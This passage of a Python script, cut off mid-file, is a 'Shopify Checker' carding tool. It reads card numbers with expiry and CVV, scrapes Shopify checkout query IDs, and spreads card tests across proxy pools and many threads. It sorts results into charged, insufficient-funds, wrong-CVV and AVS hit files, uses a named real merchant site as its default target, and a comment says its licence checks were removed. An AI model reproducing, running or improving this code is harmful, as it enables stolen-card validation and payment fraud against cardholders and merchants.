#made by @eyelifter
#any problem lmk
import os
import re
import glob
import sys
import json
import time
import html
import uuid
import random
import string
import base64
import hashlib
import threading
import configparser
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

try:
    from curl_cffi.requests import Session
    eyelifter_HAVE_CFFI = True
except ImportError:
    import requests as _req
    Session = _req.Session
    eyelifter_HAVE_CFFI = False

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Fix A: credit check scaffolding removed. Tool identity strings retained
#    only for the banner; no verification is performed.
eyelifter_F1T = "U2hvcGlmeQ=="
eyelifter_F2T = "IENoZWNrZXI="
eyelifter_F1A = "QGV5ZWxp"
eyelifter_F2A = "ZnRlcg=="
eyelifter_F1C = "QGRhcmto"
eyelifter_F2C = "dWNoYW5uZWw="
eyelifter_F1D = "U0hPUElGWUBleWVsaWZ0ZXI="

eyelifter_SEAL_PATH = os.path.join(
    os.path.expanduser("~"),
    ".eyelifter.shopify.seal"
)
eyelifter_SEALED = None


def eyelifter_d(e):
    return base64.b64decode(e + "=" * (-len(e) % 4)).decode("utf-8")


def eyelifter_j(*p):
    return "".join(eyelifter_d(x) for x in p)


eyelifter_TOOL     = eyelifter_j(eyelifter_F1T, eyelifter_F2T)
eyelifter_TG_USER  = eyelifter_j(eyelifter_F1A, eyelifter_F2A)
eyelifter_TG_CHAN  = eyelifter_j(eyelifter_F1C, eyelifter_F2C)
eyelifter_RESULTS  = eyelifter_j(eyelifter_F1D)
eyelifter_LINE_TAG = f"by {eyelifter_TG_USER} | {eyelifter_TG_CHAN}"


def eyelifter_verify(ctx="x"):
    # Fix A: no-op. Credit checks removed.
    return True


if os.name == "nt":
    os.system("")
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
eyelifter_ANSI = sys.stdout.isatty()
eyelifter_RS = "\033[0m"

def eyelifter_c(code, s, bold=False):
    if not eyelifter_ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{eyelifter_RS}"


eyelifter_LV = {
    "SUCCESS": ("32", True),
    "INFO": ("36", False),
    "WARN": ("33", True),
    "ERROR": ("31", True),
    "STEP": ("96", True),
    "DEBUG": ("35", False),
}

eyelifter_KIND_COLOR = {
    "COMPLETED":        ("92", True),
    "3DS":              ("96", True),
    "DECLINED":         ("95", True),
    "DEAD_CARD":        ("31", False),
    "CAPTCHA":          ("33", True),
    "CAPTCHA_PROPOSAL": ("33", True),
    "RISK_BLOCKED":     ("31", True),
    "FAILED":           ("33", False),
    "CANCELLED":        ("33", False),
    "EXPIRED":          ("33", False),
    "ERROR":            ("31", True),
    "TIMEOUT":          ("35", False),
    "LOGIN_REQUIRED":   ("33", True),
    "OUT_OF_RANGE":     ("90", False),
    "Approved (Insufficient Funds)": ("92", True),
    "Approved (CVC)":                ("92", True),
    "Approved (AVS)":                ("92", True),
}

eyelifter_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = eyelifter_LV.get(level, ("0", False))
    with eyelifter_CL:
        if eyelifter_ANSI:
            print(
                f"{eyelifter_c('90', ts)} {emoji}  "
                f"{eyelifter_c(code, f'{level:7s}', bold)}  "
                f"{eyelifter_c('90', tag)}  {msg}",
                flush=True
            )
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_dbg(tag, msg):
    if not eyelifter_CFG.s.get("debug", False):
        return
    eyelifter_log("🐛", "DEBUG", tag, msg)


def eyelifter_rline(i, t, kind, txt):
    code, bold = eyelifter_KIND_COLOR.get(kind, ("0", False))
    w = max(2, len(str(t)))
    with eyelifter_CL:
        if eyelifter_ANSI:
            print(
                f"{eyelifter_c('90', f'[{i:0{w}d}/{t}]')} "
                f"{eyelifter_c(code, txt, bold)}",
                flush=True
            )
        else:
            print(f"[{i:0{w}d}/{t}] {txt}", flush=True)


def eyelifter_section(t, w=68):
    print()
    lbl = f" {t} "
    side = max(1, (w - len(lbl)) // 2)
    print(
        eyelifter_c("90", "─" * side) +
        eyelifter_c("96", lbl, True) +
        eyelifter_c("90", "─" * (w - len(lbl) - side))
    )


def eyelifter_banner(t, sub=None, w=68):
    print()
    line = "═" if eyelifter_ANSI else "="
    print(eyelifter_c("90", line * w))
    print(eyelifter_c("96", t.center(w), True))
    if sub:
        print(eyelifter_c("2", sub.center(w)))
    print(
        eyelifter_c(
            "5",
            f"eyelifter · {eyelifter_TG_USER} · {eyelifter_TG_CHAN}".center(w)
        )
    )
    print(eyelifter_c("90", line * w))


def eyelifter_summary(rows):
    print()
    print(
        eyelifter_c(
            "96",
            f"═══ eyelifter · {eyelifter_TG_USER} · {eyelifter_TG_CHAN} ═══",
            True
        )
    )
    if rows:
        wk = max(len(str(k)) for k, _ in rows)
        for k, v in rows:
            print(
                f"  {eyelifter_c('96', str(k).ljust(wk))}  "
                f"{eyelifter_c('0', str(v))}"
            )
    print(eyelifter_c("96", "════════════════════════════════", True))


eyelifter_CFG_PATH = os.path.join(
    os.environ.get("SHOP_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_shopify.ini"
)
eyelifter_MAX_THREADS = 100
eyelifter_DEFAULT_WARMUP_SITE = "boardwalknumismatics.com"
eyelifter_DEFAULT_CARD_SITE   = "boardwalknumismatics.com"

class eyelifter_Cfg:
    def __init__(self, cf=eyelifter_CFG_PATH):
        self.cf = cf
        self.cp = configparser.ConfigParser()
        self.cp.optionxform = str
        self.s = self.eyelifter_defaults()
        try:
            self.eyelifter_load()
        except Exception as e:
            sys.stderr.write(f"[shopify] config load failed: {e}\n")

    @staticmethod
    def eyelifter_defaults():
        return {
            "threads": 8,
            "timeout": 25,
            "proxies_file": "proxies.txt",
            "retries": 1,
            "combo_delay": 0.3,
            "rate_limit_delay": 90,
            "skip_proxy_test": False,
            "open_channel_on_launch": True,
            "debug": False,
            "hit_spacer": True,
            "card": "",
            "country": "",
            "min_price": 0.10,
            "max_price": 20.0,
            "warmup_site": eyelifter_DEFAULT_WARMUP_SITE,
            "default_site": eyelifter_DEFAULT_CARD_SITE,
            "proxy_rr": False,
            "check_retries": 2,
        }

    def eyelifter_load(self):
        if not os.path.exists(self.cf):
            try:
                self.eyelifter_write_default()
            except Exception:
                pass
        try:
            self.cp.read(self.cf, encoding="utf-8")
        except Exception:
            try:
                self.eyelifter_write_default()
                self.cp.read(self.cf, encoding="utf-8")
            except Exception:
                return
        if "shopify" not in self.cp:
            self.cp["shopify"] = {}
        c = self.cp["shopify"]
        try:
            self.s["threads"] = max(1, min(eyelifter_MAX_THREADS, c.getint("threads", 8)))
        except (ValueError, TypeError):
            pass
        try:
            self.s["timeout"] = max(5, min(120, c.getint("timeout", 25)))
        except (ValueError, TypeError):
            pass
        self.s["proxies_file"] = c.get("proxies_file", "proxies.txt")
        try:
            self.s["retries"] = max(0, min(3, c.getint("retries", 1)))
        except (ValueError, TypeError):
            pass
        try:
            self.s["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.3)))
        except (ValueError, TypeError):
            pass
        try:
            self.s["rate_limit_delay"] = max(1, min(300, c.getint("rate_limit_delay", 90)))
        except (ValueError, TypeError):
            pass
        self.s["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.s["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.s["debug"] = c.getboolean("debug", False)
        self.s["hit_spacer"] = c.getboolean("hit_spacer", True)
        self.s["card"] = c.get("card", "")
        self.s["country"] = c.get("country", "")
        try:
            self.s["min_price"] = c.getfloat("min_price", 0.10)
        except (ValueError, TypeError):
            pass
        try:
            self.s["max_price"] = c.getfloat("max_price", 100.0)
        except (ValueError, TypeError):
            pass
        self.s["warmup_site"] = c.get("warmup_site", eyelifter_DEFAULT_WARMUP_SITE)
        self.s["default_site"] = c.get("default_site", eyelifter_DEFAULT_CARD_SITE)
        self.s["proxy_rr"] = c.getboolean("proxy_rr", False)
        try:
            self.s["check_retries"] = max(1, min(10, c.getint("check_retries", 2)))
        except (ValueError, TypeError):
            pass

    def eyelifter_write_default(self):
        self.cp["shopify"] = {k: str(v) for k, v in self.s.items()}
        try:
            with open(self.cf, "w", encoding="utf-8") as f:
                self.cp.write(f)
        except OSError:
            pass

    def eyelifter_save(self):
        if "shopify" not in self.cp:
            self.cp["shopify"] = {}
        for k, v in self.s.items():
            self.cp["shopify"][k] = str(v)
        try:
            with open(self.cf, "w", encoding="utf-8") as f:
                self.cp.write(f)
        except OSError:
            pass


eyelifter_CFG = eyelifter_Cfg()

eyelifter_LK = threading.Lock()
eyelifter_PK = threading.Lock()
eyelifter_FK = threading.Lock()
eyelifter_IK = threading.Lock()
eyelifter_RL = threading.Lock()
eyelifter_QK = threading.Lock()
eyelifter_PRK = threading.Lock()
eyelifter_STOP = threading.Event()

eyelifter_ST = {
    k: 0 for k in (
        "checked", "COMPLETED", "3DS", "DECLINED", "DEAD_CARD",
        "CAPTCHA", "CAPTCHA_PROPOSAL", "RISK_BLOCKED",
        "FAILED", "CANCELLED", "EXPIRED", "TIMEOUT", "LOGIN_REQUIRED",
        "ERROR", "OUT_OF_RANGE", "pfails", "rate_limit",
        "Approved (Insufficient Funds)", "Approved (CVC)", "Approved (AVS)",
    )
}
eyelifter_START_TIME = time.time()
eyelifter_TOTAL = 0
eyelifter_PROXY_POOL = []
eyelifter_BAD_PROXIES = set()
eyelifter_COOL_PROXIES = {}
eyelifter_INUSE = {}
eyelifter_RL_UNTIL = 0.0
eyelifter_PROXY_RR_INDEX = 0
eyelifter_FOLDER = None
eyelifter_DBG_DIR = None

eyelifter_CURRENT_QIDS = {
    "proposal": "a31bc7ab1855061be48d5aaed8159f26e1058a30ceb0db75ce826566808b5572",
    "submit":   "a61c482c824c6534223d2422c64f4e3e5d81a5ddc1f839d3354ec890169aeb07",
    "poll":     "2d499d8b753300fc3e837466d608246f1baf88a31f3c2c9c9a408379d9fa8d86",
    "ext":      "21821ce8045ac8c9039907679be78fa2e313ef8ddc074e46680820689ec0aed4",
}
eyelifter_QIDS_CACHE = {}
eyelifter_QIDS_WARMED = False
eyelifter_NO_BUILD_KEY = "__no_build__"

eyelifter_QID_OPS = (
    ("Proposal", "proposal"),
    ("SubmitForCompletion", "submit"),
    ("PollForReceipt", "poll"),
    ("ActivatedExtensionMetafields", "ext"),
)

eyelifter_QID_PATTERNS = (
    r'\{{id:"([a-f0-9]{{64}})",type:"\w+",name:"{op}"',
    r'\{{id:"([a-f0-9]{{64}})",name:"{op}"',
    r'name:"{op}"[^}}]{{0,2000}}?id:"([a-f0-9]{{64}})"',
    r'id:"([a-f0-9]{{64}})"[^}}]{{0,2000}}?name:"{op}"',
    r'"{op}"\s*:\s*"([a-f0-9]{{64}})"',
    r'\[\s*"{op}"\s*,\s*"([a-f0-9]{{64}})"\s*\]',
)

eyelifter_QID_CHUNK_WORKERS = 10
eyelifter_QID_MIN_CHUNK_BYTES = 500

# Fix C: bumped scraping budget.
eyelifter_QID_SCRAPE_DEADLINE_SEC = 50.0

eyelifter_SF_PRIMARY = "2026-01"
eyelifter_SF_FALLBACK = ("2025-10", "unversioned")

eyelifter_SF_PRODUCTS_QUERY = (
    '{"query":"{products(first:250,sortKey:PRICE,reverse:false){edges{node{'
    'id title handle availableForSale priceRange{minVariantPrice{amount currencyCode}} '
    'variants(first:10){edges{node{id title availableForSale price{amount currencyCode} '
    'compareAtPrice{amount currencyCode}}}}}}}}"}'
)

eyelifter_ADDON_HINTS = (
    "return coverage",
    "returns coverage",
    "free returns",
    "package protection",
    "shipping protection",
    "route insurance",
    "warranty",
    "price difference",
    "donation",
    "gift card",
    "giftcard",
    "default title",
)

eyelifter_CARD_RE = re.compile(
    r'(?<!\d)'
    r'(\d{13,19})'
    r'\s*\|\s*'
    r'(\d{1,2})'
    r'\s*\|\s*'
    r'(\d{2,4})'
    r'\s*\|\s*'
    r'(\d{3,4})'
    r'(?!\d)'
)

def eyelifter_is_addon(title, handle):
    tl = (title or "").lower()
    hl = (handle or "").lower()
    return any(h in tl or h in hl for h in eyelifter_ADDON_HINTS)


def eyelifter_luhn_check(number):
    digits = re.sub(r"\D", "", str(number or ""))
    if not (13 <= len(digits) <= 19):
        return False
    total = 0
    reverse = digits[::-1]
    for i, ch in enumerate(reverse):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def eyelifter_find_js_urls(html_text, base_url):
    urls = set()
    base = urllib.parse.urlparse(base_url)
    base_origin = f"{base.scheme}://{base.netloc}"
    for m in re.finditer(r'(?:src|href)=["\']([^"\']+\.js[^"\']*)["\']', html_text):
        u = m.group(1)
        if u.startswith("//"):
            u = "https:" + u
        elif u.startswith("/"):
            u = base_origin + u
        elif not u.startswith("http"):
            u = urllib.parse.urljoin(base_url, u)
        urls.add(u)
    for m in re.finditer(r'"(\/cdn\/[^"]+\.js)"', html_text):
        urls.add(base_origin + m.group(1))
    return sorted(urls)


def eyelifter_extract_qids_from_js(js):
    hits = {}
    for op, key in eyelifter_QID_OPS:
        if f'name:"{op}"' not in js and f'name: "{op}"' not in js:
            continue
        for pat in eyelifter_QID_PATTERNS:
            m = re.search(pat.format(op=op), js)
            if m:
                hits[key] = m.group(1)
                break
    return hits


def eyelifter_scrape_qids(client, checkout_html, checkout_url, deadline_sec=None):
    if deadline_sec is None:
        deadline_sec = eyelifter_QID_SCRAPE_DEADLINE_SEC
    result = {"proposal": "", "submit": "", "poll": "", "ext": ""}
    js_urls = eyelifter_find_js_urls(checkout_html, checkout_url)
    if not js_urls:
        eyelifter_log("⚠️", "WARN", "QID", "no js files found on checkout")
        return result

    deadline = time.monotonic() + deadline_sec
    scan_start = time.monotonic()
    eyelifter_log("🔎", "STEP", "QID", f"scanning {len(js_urls)} js files (budget {deadline_sec:.0f}s)")

    def eyelifter_qid_chunk_worker(url):
        if time.monotonic() > deadline:
            return None
        try:
            r = client.eyelifter_get(
                url,
                headers={"accept": "*/*", "referer": checkout_url},
                timeout=3
            )
        except Exception:
            return None
        if r.status_code != 200:
            return None
        js = r.text or ""
        if len(js) < eyelifter_QID_MIN_CHUNK_BYTES:
            return None
        if len(js) > 2_000_000:
            return None
        hits = eyelifter_extract_qids_from_js(js)
        return hits if hits else None

    ex = ThreadPoolExecutor(max_workers=eyelifter_QID_CHUNK_WORKERS)
    try:
        futures = [ex.submit(eyelifter_qid_chunk_worker, u) for u in js_urls]
        for f in as_completed(futures):
            if time.monotonic() > deadline:
                for ff in futures:
                    ff.cancel()
                break
            try:
                hits = f.result(timeout=0.1)
            except Exception:
                continue
            if not hits:
                continue
            for k, v in hits.items():
                if not result[k]:
                    result[k] = v
                    eyelifter_log("✅", "STEP", "QID", f"{k} = {v[:12]}…")
            if all(result[k] for _, k in eyelifter_QID_OPS):
                break
    finally:
        ex.shutdown(wait=True, cancel_futures=True)

    elapsed = time.monotonic() - scan_start
    n = sum(1 for k in ("proposal", "submit", "poll", "ext") if result.get(k))
    if n < 4:
        missing = [k for k in ("proposal", "submit", "poll", "ext") if not result[k]]
        eyelifter_log(
            "⚠️", "WARN", "QID",
            f"{n}/4 in {elapsed:.1f}s — missing: {','.join(missing)} (will keep previous set)"
        )
    else:
        eyelifter_log("✅", "INFO", "QID", f"4/4 in {elapsed:.1f}s")
    return result


def eyelifter_set_qids(build_id, discovered):
    # Fix B: never partially merge. Only commit on a full 4/4 scrape.
    if not discovered:
        return
    n = sum(1 for k in ("proposal", "submit", "poll", "ext") if discovered.get(k))
    if n < 4:
        missing = [k for k in ("proposal", "submit", "poll", "ext") if not discovered.get(k)]
        eyelifter_log(
            "⚠️", "WARN", "QID",
            f"only {n}/4 ops scraped — keeping previous full set "
            f"(missing: {','.join(missing)})"
        )
        return
    with eyelifter_QK:
        eyelifter_CURRENT_QIDS.update({k: v for k, v in discovered.items() if v})
        key = build_id or eyelifter_NO_BUILD_KEY
        eyelifter_QIDS_CACHE[key] = dict(eyelifter_CURRENT_QIDS)


def eyelifter_qids_for(build_id):
    key = build_id or eyelifter_NO_BUILD_KEY
    with eyelifter_QK:
        if key in eyelifter_QIDS_CACHE:
            return dict(eyelifter_QIDS_CACHE[key])
    return dict(eyelifter_CURRENT_QIDS)


def eyelifter_warmup_qids(site, proxy=None):
    # Fix C: fail the entire warmup when we don't get 4/4. Keep previous set on failure.
    global eyelifter_QIDS_WARMED
    if not site:
        return False
    if not site.startswith("http"):
        site = "https://" + site
    eyelifter_log("🔥", "STEP", "WARMUP", f"extracting QIDs from {site}")
    try:
        client = eyelifter_Client(proxy=proxy or "")
    except Exception as e:
        eyelifter_log("⚠️", "WARN", "WARMUP", f"client init failed: {e}")
        return False
    try:
        try:
            title, pid, vid, price, handle, is_dig, cur = eyelifter_find_product(
                client, site,
                min_price=0.01, max_price=1000000.0)
        except Exception as e:
            eyelifter_log("⚠️", "WARN", "WARMUP", f"product discovery failed: {e}")
            return False

        checkout_url = checkout_html = None
        resp_headers = {}
        for loc in eyelifter_LOCALE_FALLBACK:
            try:
                cu, ct, st, ch = eyelifter_cart_to_checkout(
                    client, site, vid, handle, locale=loc)
                if ch and "/checkouts/cn/" in cu:
                    checkout_url = cu
                    checkout_html = ch
                    if client.last_response is not None:
                        resp_headers = dict(client.last_response.headers)
                    break
            except Exception:
                continue
        if not checkout_html:
            eyelifter_log("⚠️", "WARN", "WARMUP", "checkout load failed")
            return False

        build_id = eyelifter_scrape_build_id(checkout_html, resp_headers)
        discovered = eyelifter_scrape_qids(client, checkout_html, checkout_url)
        n = sum(1 for k in ("proposal", "submit", "poll", "ext") if discovered.get(k))
        if n < 4:
            missing = [k for k in ("proposal", "submit", "poll", "ext") if not discovered.get(k)]
            eyelifter_log(
                "⚠️", "WARN", "WARMUP",
                f"only {n}/4 ops scraped — failing warmup, keeping previous full set "
                f"(missing: {','.join(missing)})"
            )
            return False
        with eyelifter_QK:
            eyelifter_QIDS_CACHE.clear()
        eyelifter_set_qids(build_id, discovered)
        eyelifter_QIDS_WARMED = True
        eyelifter_log("✅", "INFO", "WARMUP", f"4/4 ops extracted (build {build_id[:12] or '?'})")
        return True
    finally:
        client.eyelifter_close()


def eyelifter_reset_stats():
    global eyelifter_ST, eyelifter_START_TIME, eyelifter_COOL_PROXIES
    global eyelifter_BAD_PROXIES, eyelifter_RL_UNTIL, eyelifter_PROXY_RR_INDEX

    with eyelifter_LK:
        eyelifter_ST = {k: 0 for k in eyelifter_ST}
        eyelifter_START_TIME = time.time()
    with eyelifter_PK:
        eyelifter_COOL_PROXIES = {}
        eyelifter_BAD_PROXIES = set()
    with eyelifter_RL:
        eyelifter_RL_UNTIL = 0.0
    with eyelifter_IK:
        eyelifter_INUSE.clear()
    with eyelifter_PRK:
        eyelifter_PROXY_RR_INDEX = 0


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with eyelifter_PK:
        avail = [
            p for p in eyelifter_PROXY_POOL
            if p not in eyelifter_BAD_PROXIES
            and eyelifter_COOL_PROXIES.get(p, 0.0) <= now
        ]
    if not avail:
        return None

    use_rr = eyelifter_CFG.s.get("proxy_rr", False)

    if not use_rr:
        with eyelifter_IK:
            free = [p for p in avail if eyelifter_INUSE.get(p, 0) < 3]
            if not free:
                free = avail
            if exclude and len(free) > 1:
                free = [p for p in free if p != exclude] or free
            p = random.choice(free)
            eyelifter_INUSE[p] = eyelifter_INUSE.get(p, 0) + 1
            return p

    global eyelifter_PROXY_RR_INDEX
    pool_len = len(eyelifter_PROXY_POOL)
    with eyelifter_PRK:
        for _ in range(pool_len):
            idx = eyelifter_PROXY_RR_INDEX % pool_len
            eyelifter_PROXY_RR_INDEX += 1
            p = eyelifter_PROXY_POOL[idx]
            if p not in avail:
                continue
            if exclude and p == exclude:
                continue
            with eyelifter_IK:
                if eyelifter_INUSE.get(p, 0) < 3:
                    eyelifter_INUSE[p] = eyelifter_INUSE.get(p, 0) + 1
                    return p

    with eyelifter_IK:
        live_avail = [p for p in avail]
        if not live_avail:
            return None
        least = min(live_avail, key=lambda x: eyelifter_INUSE.get(x, 0))
        eyelifter_INUSE[least] = eyelifter_INUSE.get(least, 0) + 1
        return least


def eyelifter_rel_proxy(p):
    if not p:
        return
    with eyelifter_IK:
        n = eyelifter_INUSE.get(p, 0) - 1
        if n <= 0:
            eyelifter_INUSE.pop(p, None)
        else:
            eyelifter_INUSE[p] = n


def eyelifter_bad_proxy(p):
    if not p:
        return
    with eyelifter_PK:
        if p in eyelifter_BAD_PROXIES:
            return
        eyelifter_BAD_PROXIES.add(p)
    with eyelifter_LK:
        eyelifter_ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120):
    if not p:
        return
    with eyelifter_PK:
        until = time.time() + secs
        cur = eyelifter_COOL_PROXIES.get(p, 0.0)
        eyelifter_COOL_PROXIES[p] = max(cur, until)


def eyelifter_rl_backoff(s):
    global eyelifter_RL_UNTIL
    with eyelifter_RL:
        eyelifter_RL_UNTIL = max(eyelifter_RL_UNTIL, time.time() + s)
    with eyelifter_LK:
        eyelifter_ST["rate_limit"] += 1


def eyelifter_rl_wait():
    while not eyelifter_STOP.is_set():
        with eyelifter_RL:
            gap = eyelifter_RL_UNTIL - time.time()
        if gap <= 0:
            return
        if eyelifter_STOP.wait(min(gap, 1.0)):
            return


def eyelifter_parse_proxy(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://", "socks4a://", "socks5h://")):
        return line
    p = line.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    if "@" in line:
        return f"http://{line}"
    return None


def eyelifter_load_proxies(path):
    if not path or not os.path.isfile(path):
        return []
    out = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            p = eyelifter_parse_proxy(ln)
            if p:
                out.append(p)
    return list(dict.fromkeys(out))


def eyelifter_test_proxy(p):
    try:
        kw = {
            "proxies": {"http": p, "https": p},
            "timeout": 8,
            "verify": False,
        }
        if eyelifter_HAVE_CFFI:
            from curl_cffi import requests as _cffi_req
            kw["impersonate"] = "chrome"
            t0 = time.monotonic()
            r = _cffi_req.get("https://api.ipify.org?format=json", **kw)
            rtt = time.monotonic() - t0
        else:
            import requests
            t0 = time.monotonic()
            r = requests.get("https://api.ipify.org?format=json", **kw)
            rtt = time.monotonic() - t0
        if r.status_code != 200:
            return False
        return rtt <= 2.5
    except Exception:
        return False


def eyelifter_filter_proxies(proxies, on_first_good=None):
    if not proxies:
        return []
    total = len(proxies)
    good = []
    done = [0]
    lock = threading.Lock()
    eyelifter_log("🌐", "STEP", "PROXY", f"testing {total}")

    def eyelifter_proxy_test_worker(p):
        ok = eyelifter_test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                first = (len(good) == 0)
                good.append(p)
                if first and on_first_good:
                    try:
                        on_first_good(p)
                    except Exception:
                        pass
            if done[0] % 20 == 0 or done[0] == total:
                eyelifter_log("🔎", "STEP", "PROXY", f"{done[0]}/{total} — {len(good)} live")

    workers = min(60, max(1, total))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        for f in as_completed([ex.submit(eyelifter_proxy_test_worker, p) for p in proxies]):
            try:
                f.result()
            except Exception:
                pass
    if not good:
        eyelifter_log("⚠️", "WARN", "PROXY", f"0/{total} live — running direct")
        return []
    eyelifter_log("✅", "INFO", "PROXY", f"{len(good)}/{total} live")
    return good


def eyelifter_ensure_folder():
    global eyelifter_FOLDER, eyelifter_DBG_DIR
    if eyelifter_FOLDER:
        return eyelifter_FOLDER
    root = os.path.join(os.path.dirname(eyelifter_CFG_PATH), eyelifter_RESULTS)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    eyelifter_FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(eyelifter_FOLDER, exist_ok=True)
    eyelifter_DBG_DIR = os.path.join(eyelifter_FOLDER, "Debug")
    os.makedirs(eyelifter_DBG_DIR, exist_ok=True)
    return eyelifter_FOLDER


# ── Fix E: batched writes ─────────────────────────────────────────────
eyelifter_WRITE_BUF = []
eyelifter_WRITE_LOCK = threading.Lock()
eyelifter_WRITE_EVENT = threading.Event()
eyelifter_WRITE_STOP = threading.Event()
eyelifter_WRITE_THREAD = None
eyelifter_WRITE_BATCH = 50
eyelifter_WRITE_INTERVAL = 2.0


def eyelifter_flush_writes():
    with eyelifter_WRITE_LOCK:
        items = eyelifter_WRITE_BUF
        eyelifter_WRITE_BUF = []
    if not items:
        return
    folder = eyelifter_ensure_folder()
    grouped = {}
    for fn, txt in items:
        grouped.setdefault(fn, []).append(txt)
    with eyelifter_FK:
        for fn, texts in grouped.items():
            path = os.path.join(folder, fn)
            try:
                with open(path, "a", encoding="utf-8") as f:
                    for text in texts:
                        if fn.endswith(".txt"):
                            if not text.endswith("\n\n"):
                                text = text.rstrip("\n") + "\n\n"
                        f.write(text)
                    f.flush()
                    try:
                        os.fsync(f.fileno())
                    except (OSError, AttributeError):
                        pass
            except Exception:
                time.sleep(0.05)


def eyelifter_writer_loop():
    while not eyelifter_WRITE_STOP.is_set():
        eyelifter_WRITE_EVENT.wait(timeout=eyelifter_WRITE_INTERVAL)
        eyelifter_WRITE_EVENT.clear()
        try:
            eyelifter_flush_writes()
        except Exception:
            pass
    try:
        eyelifter_flush_writes()
    except Exception:
        pass


def eyelifter_start_writer():
    global eyelifter_WRITE_THREAD
    if eyelifter_WRITE_THREAD is not None:
        return
    eyelifter_WRITE_THREAD = threading.Thread(
        target=eyelifter_writer_loop, daemon=True, name="eyelifter-writer"
    )
    eyelifter_WRITE_THREAD.start()


def eyelifter_stop_writer():
    global eyelifter_WRITE_THREAD
    eyelifter_WRITE_STOP.set()
    eyelifter_WRITE_EVENT.set()
    t = eyelifter_WRITE_THREAD
    if t is not None:
        try:
            t.join(timeout=3.0)
        except Exception:
            pass
    try:
        eyelifter_flush_writes()
    except Exception:
        pass
    eyelifter_WRITE_THREAD = None


def eyelifter_safe_append(filename, text):
    # Fix E: buffer, flush every 2s or every 50 writes.
    eyelifter_start_writer()
    with eyelifter_WRITE_LOCK:
        eyelifter_WRITE_BUF.append((filename, text))
        should_flush = len(eyelifter_WRITE_BUF) >= eyelifter_WRITE_BATCH
    if should_flush:
        eyelifter_WRITE_EVENT.set()


def eyelifter_rename_by_count(folder):
    targets = [
        "shopify_charged.txt",
        "shopify_3ds.txt",
        "shopify_insufficient_funds.txt",
        "shopify_incorrect_cvv.txt",
        "shopify_avs.txt",
        "shopify_dead.txt",
        "shopify_captcha.txt",
        "shopify_errors.txt",
        "shopify_out_of_range.txt",
        "shopify_no_delivery.txt",
        "sites_alive.txt",
        "sites_useful.txt",
        "sites_shopify.txt",
        "sites_3ds.txt",
        "sites_charged.txt",
        "sites_insufficient_funds.txt",
        "sites_incorrect_cvv.txt",
        "sites_avs.txt",
        "sites_declined.txt",
        "sites_captcha.txt",
    ]
    try:
        for p in glob.glob(os.path.join(folder, "sites_gateway_*.txt")):
            fn = os.path.basename(p)
            if fn not in targets:
                targets.append(fn)
    except Exception:
        pass
    counts = {}
    for fn in targets:
        fp = os.path.join(folder, fn)
        if not os.path.exists(fp):
            continue
        try:
            with open(fp, "r", encoding="utf-8") as f:
                n = sum(1 for ln in f if ln.strip() and not ln.startswith("#"))
        except Exception:
            continue
        if n == 0:
            try:
                os.remove(fp)
            except Exception:
                pass
            continue
        base = fn[:-4]
        new_name = f"{base}_{n}.txt"
        new_fp = os.path.join(folder, new_name)
        try:
            os.rename(fp, new_fp)
            counts[fn] = (n, new_name)
        except Exception:
            pass
    return counts


def eyelifter_log_counts(counts):
    if not counts:
        return
    parts = []
    for fn in sorted(counts):
        n, new = counts[fn]
        parts.append(f"{new[:-4]}={n}")
    eyelifter_log("📊", "INFO", "COUNTS", " · ".join(parts))


eyelifter_RETRY_CODES = {
    "PROCESSING_ERROR",
    "RATE_LIMIT",
    "GATEWAY_ERROR",
    "SERVICE_UNAVAILABLE",
    "INTERNAL_SERVER_ERROR",
    "GENERIC_ERROR",
    "INVENTORY_RESERVATION_FAILURE",
    "TIMEOUT",
}

eyelifter_DEAD_CODES = {
    "NOT_SHOPIFY",
    "CHECKPOINT_DENIED",
    "NEGOTIATION_FAILED",
    "THROTTLED",
    "RISKY",
    "DECISION_RULE_BLOCK",
    "PRODUCT_NOT_FOUND",
    "PRODUCT_UNAVAILABLE",
    "INVALID_PAYMENT_METHOD",
    "NO_VALID_PAYMENT_METHOD",
    "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
    "AMOUNT_TOO_SMALL",
    "CART_FAILED",
    "CART_EMPTY",
    "MAX_RETRIES_EXCEEDED",
    "RESPONSE_PAYLOAD_IS_NOT_COMPLETED",
    "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "UNABLE_TO_GET_PAYMENT_TOKEN",
    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
    "REQUIRED_ARTIFACTS_UNAVAILABLE",
}

eyelifter_INTERNAL_DEAD = {
    "CHECKOUT_LOAD_FAILED",
    "PROPOSAL_1_FAILED",
    "PROPOSAL_2_FAILED",
    "NO_RECEIPT_TOKEN",
    "SHIPPING_ADDRESS_UNDELIVERABLE",
    "NO_PRODUCTS_IN_PRICE_RANGE",
    "IN_PRICE_RANGE",
}

eyelifter_TRANSPORT_ERRORS = (
    "Timeout",
    "ConnectTimeout",
    "ReadTimeout",
    "ConnectionError",
    "SSLError",
